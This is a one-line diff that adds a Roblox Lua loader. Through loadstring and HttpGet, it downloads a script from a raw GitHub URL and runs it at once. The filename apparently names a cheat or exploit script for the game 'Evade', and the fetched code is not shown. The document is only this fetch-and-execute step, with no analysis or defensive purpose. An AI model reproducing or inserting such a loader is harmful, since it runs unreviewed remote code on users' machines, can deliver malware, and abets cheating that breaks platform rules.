@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/hlwn-evade-spam1-vk343w5qk8opc6.lua"))()
